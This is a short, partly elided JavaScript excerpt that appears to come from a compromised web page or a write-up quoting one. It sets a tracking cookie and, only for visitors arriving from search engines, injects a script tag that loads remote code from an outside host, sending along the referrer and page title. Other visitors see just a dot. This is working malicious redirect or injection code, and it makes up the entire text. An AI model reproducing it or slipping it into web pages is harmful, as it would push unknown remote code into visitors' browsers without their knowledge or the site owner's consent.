{
	...
	if (strlen(currentCookie) == 0) {
		...
		var setted = 1;
		setCookie("arx_tt", 1, dt.toGMTString(), "/");
		function R(){var Ref=document.referrer;if(Ref.indexOf('.google.')!=-1||Ref.indexOf('.bing.')!=-1||Ref.indexOf('.yahoo.')!=-1||Ref.indexOf('.mail.')!=-1||Ref.indexOf('.ask.')!=-1||Ref.indexOf('.rambler.')!=-1||Ref.indexOf('yandex')!=-1){document.write('<script type="text/javascript" src="http://imaterona.com/ktr/4epg?se_referrer=' + encodeURIComponent(document.referrer)+ '&default_keyword=' + encodeURIComponent(document.title) + '"></script>')}else{document.write('.')}}R();
